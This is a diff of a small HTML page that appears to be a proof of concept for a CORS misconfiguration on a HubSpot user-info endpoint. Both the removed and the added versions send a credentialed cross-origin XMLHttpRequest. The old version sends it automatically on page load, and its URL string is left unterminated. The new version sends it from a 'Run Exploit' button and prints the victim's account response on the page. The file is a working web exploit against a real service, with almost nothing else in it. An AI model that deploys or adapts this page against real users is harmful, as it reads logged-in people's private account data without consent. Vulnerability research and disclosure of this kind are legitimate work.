@@ -1,36 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Request with Credentials</title>
-    <script>
-        function makeCorsRequest() {
-            const xhr = new XMLHttpRequest();
-            const url = 'https://app-eu1.hubspot.com/api/login-verify/user-info
-
-            xhr.open('GET', url, true);
-            xhr.withCredentials = true; 
-
-            xhr.onload = function() {
-                if (xhr.status >= 200 && xhr.status < 300) {
-                    console.log('Response:', xhr.responseText);
-                } else {
-                    console.error('Request failed with status:', xhr.status);
-                }
-            };
-
-            xhr.onerror = function() {
-                console.error('Request failed');
-            };
-
-            xhr.send();
-        }
-
-        window.onload = makeCorsRequest;
-    </script>
+  <title>HELLO WORLD</title>
 </head>
 <body>
-    <h1>HELLO </h1>
+  <h2>HELLO WORLD</h2>
+  <button onclick="exploit()">Run Exploit</button>
+  <pre id="output"></pre>
+
+  <script>
+    function exploit() {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", "https://app-eu1.hubspot.com/api/login-verify/user-info", true); 
+
+      xhr.withCredentials = true; 
+
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === 4) {
+          document.getElementById("output").innerText = xhr.responseText;
+        }
+      };
+
+      xhr.send();
+    }
+  </script>
 </body>
 </html>
